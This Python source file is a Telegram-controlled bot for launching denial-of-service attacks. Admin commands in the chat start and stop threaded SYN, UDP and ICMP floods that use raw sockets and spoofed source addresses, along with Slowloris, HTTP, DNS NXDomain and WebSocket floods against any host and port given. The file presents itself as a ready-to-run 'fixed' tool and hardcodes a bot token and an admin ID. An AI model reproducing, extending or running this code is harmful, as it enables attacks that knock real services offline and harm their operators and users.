#!/usr/bin/env python3
"""DDOS-Telegram-BOT v2 — full fixed. Run: sudo -E python3 -m app"""

import os
import sys
import time
import random
import socket
import struct
import threading
import subprocess

import telebot
from telebot import types

# ─────────────────────────────────────────────────────────────
TOKEN = "8957659231:AAHnCq3wxmlAUv3-hxpv-c4INZgSwchkvTE"
ADMIN_CHAT_ID = int(os.environ.get("TG_ADMIN_ID", "8789271943"))
# ─────────────────────────────────────────────────────────────

bot = telebot.TeleBot(TOKEN)
user_attacks = {}

STOP_EVENTS = {}
ACTIVE_THREADS = {}
STATS = {}
STATE_LOCK = threading.Lock()

ATTACK_METHODS = {
    "1": "SYN Flood (Layer 4 Tsunami)",
    "2": "UDP Flood (Bandwidth Annihilator)",
    "3": "HTTP Slowloris (Connection Strangler)",
    "4": "ICMP Ping Storm (Packet Hurricane)",
    "5": "DNS Water Torture (NXDomain Overload)",
    "6": "WebSocket Armageddon (Layer 7 Apocalypse)",
}

NAME_TO_ID = {"syn": "1", "udp": "2", "slowloris": "3", "icmp": "4", "dns": "5", "ws": "6"}


# ─────────────────────────────────────────────────────────────
def is_valid_ip(s):
    try:
        socket.inet_aton(s)
        return s.count(".") == 3
    except OSError:
        return False


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def random_ip():
    while True:
        ip = socket.inet_ntoa(struct.pack("!I", random.getrandbits(32)))
        a, b, _, _ = map(int, ip.split("."))
        if a in (0, 10, 127): continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a == 169 and b == 254: continue
        if a >= 224: continue
        return ip


def build_ip_header(src_ip, dst_ip, proto, payload_len):
    tot = 20 + payload_len
    ip_id = random.randint(0, 65535)
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, ip_id, 0, 64, proto, 0,
                      socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
    chk = checksum(hdr)
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, tot, ip_id, 0, 64, proto, chk,
                       socket.inet_aton(src_ip), socket.inet_aton(dst_ip))


# ─────────────────────────────────────────────────────────────
def syn_flood(target_ip, target_port, stop_event, stats):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not stop_event.is_set():
            src_ip = random_ip()
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 0xFFFFFFFF)
            tcp = struct.pack("!HHIIBBHHH", src_port, target_port, seq, 0, (5 << 4), 0x02, 64240, 0, 0)
            ip = build_ip_header(src_ip, target_ip, socket.IPPROTO_TCP, len(tcp))
            try:
                sock.sendto(ip + tcp, (target_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] syn_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] syn_flood: {e}", file=sys.stderr)


def udp_flood(target_ip, target_port, stop_event, stats, size=1400):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not stop_event.is_set():
            src_ip = random_ip()
            src_port = random.randint(1024, 65535)
            payload = os.urandom(size)
            udp_len = 8 + len(payload)
            udp = struct.pack("!HHHH", src_port, target_port, udp_len, 0)
            ip = build_ip_header(src_ip, target_ip, socket.IPPROTO_UDP, udp_len)
            try:
                sock.sendto(ip + udp + payload, (target_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] udp_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] udp_flood: {e}", file=sys.stderr)


def icmp_flood(target_ip, stop_event, stats, size=1400):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        while not stop_event.is_set():
            payload = os.urandom(size)
            id_ = random.randint(0, 65535)
            seq = random.randint(0, 65535)
            hdr = struct.pack("!BBHHH", 8, 0, 0, id_, seq)
            chk = checksum(hdr + payload)
            hdr = struct.pack("!BBHHH", 8, 0, chk, id_, seq)
            try:
                sock.sendto(hdr + payload, (target_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] icmp_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] icmp_flood: {e}", file=sys.stderr)


def slowloris(target, port, stop_event, stats):
    uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
           "Mozilla/5.0 (X11; Linux x86_64)",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
    while not stop_event.is_set():
        try:
            s = socket.socket()
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            for i in range(20):
                if stop_event.is_set():
                    break
                s.send(f"X-{i}-{random.randint(0,9999)}: {random.choice(uas)}\r\n".encode())
                time.sleep(random.uniform(8, 15))
            stats["pkts"] += 1
        except Exception:
            pass


def http_flood(target, port, stop_event, stats, path="/"):
    uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
           "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"]
    while not stop_event.is_set():
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, port))
            req = (f"GET {path}?{random.randint(0,999999)} HTTP/1.1\r\n"
                   f"Host: {target}\r\nUser-Agent: {random.choice(uas)}\r\n"
                   f"Accept: */*\r\nConnection: close\r\n\r\n")
            s.send(req.encode())
            try:
                s.recv(1024)
            except Exception:
                pass
            s.close()
            stats["pkts"] += 1
        except Exception:
            time.sleep(0.05)


def dns_nxdomain(target, stop_event, stats):
    while not stop_event.is_set():
        sub = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=12))
        try:
            subprocess.run(["nslookup", f"{sub}.{target}"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
            stats["pkts"] += 1
        except Exception:
            pass


def websocket_flood(target, port, stop_event, stats):
    try:
        from websocket import create_connection
    except ImportError:
        print("[!] websocket-client not installed", file=sys.stderr)
        return
    while not stop_event.is_set():
        try:
            ws = create_connection(f"ws://{target}:{port}/", timeout=3)
            ws.send("0" * (1024 * 1024))
            ws.close()
            stats["pkts"] += 1
        except Exception:
            pass


def ping_flood(target, stop_event, stats):
    while not stop_event.is_set():
        try:
            subprocess.run(["ping", "-c", "100", "-s", "65500", target],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            stats["pkts"] += 100
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────
def launch(method_id, target_ip, target_port, threads, chat_id):
    key = f"{chat_id}:{method_id}:{target_ip}:{target_port}"
    with STATE_LOCK:
        if key in STOP_EVENTS:
            return None, "already running"
        stop_event = threading.Event()
        STOP_EVENTS[key] = stop_event
        stats = {"pkts": 0, "start": time.time(), "threads": threads}
        STATS[key] = stats

    def worker():
        if method_id == "1":
            syn_flood(target_ip, target_port or random.randint(1, 65535), stop_event, stats)
        elif method_id == "2":
            udp_flood(target_ip, target_port or 53, stop_event, stats)
        elif method_id == "3":
            slowloris(target_ip, target_port or 80, stop_event, stats)
        elif method_id == "4":
            ping_flood(target_ip, stop_event, stats)
        elif method_id == "5":
            dns_nxdomain(target_ip, stop_event, stats)
        elif method_id == "6":
            websocket_flood(target_ip, target_port or 80, stop_event, stats)

    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ACTIVE_THREADS.setdefault(key, []).append(t)

    return key, None


def stop_key(key):
    with STATE_LOCK:
        ev = STOP_EVENTS.pop(key, None)
        ACTIVE_THREADS.pop(key, [])
        STATS.pop(key, None)
    if ev:
        ev.set()
        return True
    return False


def stop_all():
    with STATE_LOCK:
        keys = list(STOP_EVENTS.keys())
    for k in keys:
        stop_key(k)
    return keys


# ─────────────────────────────────────────────────────────────
def is_admin(m):
    return m.from_user.id == ADMIN_CHAT_ID


@bot.message_handler(commands=["start"])
def show_attack_menu(message):
    if not is_admin(message):
        bot.reply_to(message, "⛔ unauthorized")
        return
    markup = types.InlineKeyboardMarkup(row_width=2)
    for num, desc in ATTACK_METHODS.items():
        markup.add(types.InlineKeyboardButton(f"{num}. {desc}", callback_data=f"attack_{num}"))
    bot.send_message(
        message.chat.id,
        "<b>⚡ CONTROL PANEL ⚡</b>\n\n"
        "Menu se method chuno, phir target bhejo (host:port).\n"
        "Ya direct:\n"
        "<code>/attack &lt;method&gt; &lt;host:port&gt; [threads]</code>\n"
        "methods: syn udp slowloris icmp dns ws\n\n"
        "/stop &lt;key&gt;  /stopall  /active",
        parse_mode="HTML",
        reply_markup=markup,
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith("attack_"))
def set_attack_method(call):
    if call.from_user.id != ADMIN_CHAT_ID:
        bot.answer_callback_query(call.id, "unauthorized", show_alert=True)
        return
    mid = call.data.split("_", 1)[1]
    user_attacks[call.message.chat.id] = {"method": mid}
    bot.send_message(call.message.chat.id,
                     f"⛔ {ATTACK_METHODS[mid]} SELECTED\nSend target host:port:")
    bot.answer_callback_query(call.id)


@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "usage: /stop <key>")
        return
    bot.reply_to(message, "stopped" if stop_key(parts[1].strip()) else "not found")


@bot.message_handler(commands=["stopall"])
def cmd_stopall(message):
    if not is_admin(message): return
    bot.reply_to(message, f"stopped {len(stop_all())}")


@bot.message_handler(commands=["active"])
def cmd_active(message):
    if not is_admin(message): return
    with STATE_LOCK:
        keys = list(STOP_EVENTS.keys())
        snap = {k: dict(STATS.get(k, {})) for k in keys}
    if not keys:
        bot.reply_to(message, "nothing running")
        return
    lines = ["<b>Active</b>"]
    now = time.time()
    for k in keys:
        st = snap.get(k, {})
        pkts = st.get("pkts", 0)
        start = st.get("start", now)
        th = st.get("threads", 0)
        age = max(0.001, now - start)
        pps = pkts / age
        lines.append(f"<code>{k}</code>\n  pkts={pkts}  age={int(age)}s  pps={int(pps)}  th={th}")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["attack"])
def cmd_attack(message):
    if not is_admin(message): return
    parts = message.text.split()          # ← FIXED
    if len(parts) < 3:
        bot.reply_to(message,
                     "usage: /attack <method> <host:port> [threads]\n"
                     "methods: syn udp slowloris icmp dns ws")
        return

    method_name = parts[1].lower()
    raw_target = parts[2].strip()
    threads = 50
    if len(parts) >= 4:
        try:
            threads = max(1, min(200, int(parts[3])))
        except ValueError:
            pass

    method_id = NAME_TO_ID.get(method_name)
    if not method_id:
        bot.reply_to(message, f"unknown method: {method_name}")
        return

    port = None
    target = raw_target
    if ":" in raw_target:
        host_part, port_part = raw_target.rsplit(":", 1)
        try:
            port = int(port_part)
            target = host_part
        except ValueError:
            pass

    try:
        ip = target if is_valid_ip(target) else socket.gethostbyname(target)
    except Exception as e:
        bot.reply_to(message, f"resolve failed: {e}")
        return

    label = ATTACK_METHODS[method_id]
    target_str = f"{ip}:{port}" if port else ip

    bot.send_message(message.chat.id, f"🚀 {label} → {target_str}  th={threads}")
    key, err = launch(method_id, ip, port, threads, message.chat.id)
    if err:
        bot.send_message(message.chat.id, f"error: {err}")
        return
    bot.send_message(ADMIN_CHAT_ID,
                     f"☠️ DEPLOYED\n{label}\n{target_str}\nth={threads}\nkey={key}")


@bot.message_handler(func=lambda m: m.chat.id in user_attacks and not m.text.startswith("/"))
def execute_attack(message):
    if not is_admin(message): return
    chat_id = message.chat.id
    raw = message.text.strip()

    try:
        port = None
        target = raw
        if ":" in raw:
            host_part, port_part = raw.rsplit(":", 1)
            try:
                port = int(port_part)
                target = host_part
            except ValueError:
                pass

        ip = target if is_valid_ip(target) else socket.gethostbyname(target)
        method_id = user_attacks[chat_id]["method"]
        label = ATTACK_METHODS[method_id]
        target_str = f"{ip}:{port}" if port else ip

        bot.send_message(chat_id, f"🚀 {label} → {target_str}")
        key, err = launch(method_id, ip, port, 50, chat_id)
        if err:
            bot.send_message(chat_id, f"error: {err}")
            return
        bot.send_message(ADMIN_CHAT_ID,
                         f"☠️ DEPLOYED\n{label}\n{target_str}\nkey={key}")
    except Exception as e:
        bot.send_message(chat_id, f"💥 {e}")
        print(f"[!] {e}", file=sys.stderr)


# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if TOKEN in ("PASTE_NEW_TOKEN_HERE", "", None):
        print("[!] set TG_BOT_TOKEN"); sys.exit(1)
    if os.geteuid() != 0:
        print("[!] WARNING: not root")
    print("DDOS-Telegram-BOT v2 (fixed)")
    bot.infinity_polling(timeout=30, long_polling_timeout=25)
